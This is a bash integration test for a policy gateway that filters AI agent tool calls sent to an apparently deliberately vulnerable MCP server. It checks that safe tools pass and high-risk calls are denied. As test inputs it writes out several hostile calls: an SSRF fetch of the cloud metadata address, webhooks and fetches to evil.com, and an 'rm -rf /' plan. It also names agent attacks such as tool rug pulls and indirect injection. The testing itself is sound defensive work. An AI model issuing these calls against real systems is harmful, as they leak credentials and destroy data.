#!/usr/bin/env bash
# Integration test: nullfield + camazotz
# Prerequisites: camazotz on :8080, nullfield on :9090 with camazotz policy/registry
#
# Start nullfield:
#   NULLFIELD_UPSTREAM_ADDR=localhost:8080 \
#   NULLFIELD_POLICY_PATH=integrations/camazotz/policy.yaml \
#   NULLFIELD_REGISTRY_PATH=integrations/camazotz/tools.yaml \
#   ./bin/nullfield

BASE="http://localhost:9090/mcp"
PASS=0
FAIL=0

check() {
  local desc="$1" expected="$2" actual="$3"
  if echo "$actual" | grep -q "$expected"; then
    echo "  PASS: $desc"
    PASS=$((PASS + 1))
  else
    echo "  FAIL: $desc"
    echo "        expected to contain: $expected"
    echo "        got: $(echo "$actual" | head -1)"
    FAIL=$((FAIL + 1))
  fi
}

post() {
  curl -s -X POST "$BASE" -H "Content-Type: application/json" -d "$1" 2>&1
}

echo "=== nullfield + camazotz integration tests ==="
echo ""

echo "[passthrough]"
resp=$(post '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}')
check "initialize returns server info" "camazotz" "$resp"

resp=$(post '{"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}')
count=$(echo "$resp" | python3 -c "import sys,json; print(len(json.load(sys.stdin)['result']['tools']))" 2>/dev/null || echo "0")
check "tools/list returns 57 tools" "57" "$count"

echo ""
echo "[tier 1 — read-only tools ALLOWED]"
resp=$(post '{"jsonrpc":"2.0","id":10,"method":"tools/call","params":{"name":"audit.list_actions","arguments":{}}}')
check "audit.list_actions" "result" "$resp"

resp=$(post '{"jsonrpc":"2.0","id":11,"method":"tools/call","params":{"name":"tenant.list_tenants","arguments":{}}}')
check "tenant.list_tenants" "result" "$resp"

resp=$(post '{"jsonrpc":"2.0","id":12,"method":"tools/call","params":{"name":"cost.check_usage","arguments":{}}}')
check "cost.check_usage" "result" "$resp"

echo ""
echo "[tier 2 — write tools ALLOWED]"
resp=$(post '{"jsonrpc":"2.0","id":20,"method":"tools/call","params":{"name":"comms.send_message","arguments":{"to":"test","body":"hello"}}}')
check "comms.send_message" "result" "$resp"

resp=$(post '{"jsonrpc":"2.0","id":21,"method":"tools/call","params":{"name":"auth.issue_token","arguments":{"username":"testuser"}}}')
check "auth.issue_token" "result" "$resp"

echo ""
echo "[tier 3 — high-risk tools DENIED]"
resp=$(post '{"jsonrpc":"2.0","id":30,"method":"tools/call","params":{"name":"secrets.leak_config","arguments":{}}}')
check "secrets.leak_config BLOCKED" "denied by policy" "$resp"

resp=$(post '{"jsonrpc":"2.0","id":31,"method":"tools/call","params":{"name":"egress.fetch_url","arguments":{"url":"http://169.254.169.254/"}}}')
check "egress.fetch_url BLOCKED (SSRF)" "denied by policy" "$resp"

resp=$(post '{"jsonrpc":"2.0","id":32,"method":"tools/call","params":{"name":"supply.install_package","arguments":{"package":"evil"}}}')
check "supply.install_package BLOCKED" "denied by policy" "$resp"

resp=$(post '{"jsonrpc":"2.0","id":33,"method":"tools/call","params":{"name":"tool.mutate_behavior","arguments":{"mode":"evil"}}}')
check "tool.mutate_behavior BLOCKED (rug pull)" "denied by policy" "$resp"

resp=$(post '{"jsonrpc":"2.0","id":34,"method":"tools/call","params":{"name":"shadow.register_webhook","arguments":{"url":"http://evil.com"}}}')
check "shadow.register_webhook BLOCKED" "denied by policy" "$resp"

resp=$(post '{"jsonrpc":"2.0","id":35,"method":"tools/call","params":{"name":"hallucination.execute_plan","arguments":{"plan":"rm -rf /"}}}')
check "hallucination.execute_plan BLOCKED" "denied by policy" "$resp"

resp=$(post '{"jsonrpc":"2.0","id":36,"method":"tools/call","params":{"name":"indirect.fetch_and_summarize","arguments":{"url":"http://evil.com"}}}')
check "indirect.fetch_and_summarize BLOCKED" "denied by policy" "$resp"

echo ""
echo "[unregistered tool]"
resp=$(post '{"jsonrpc":"2.0","id":40,"method":"tools/call","params":{"name":"totally.fake","arguments":{}}}')
check "totally.fake BLOCKED (not registered)" "not registered" "$resp"

echo ""
echo "=== Results: $PASS passed, $FAIL failed ==="
[ "$FAIL" -eq 0 ] || exit 1
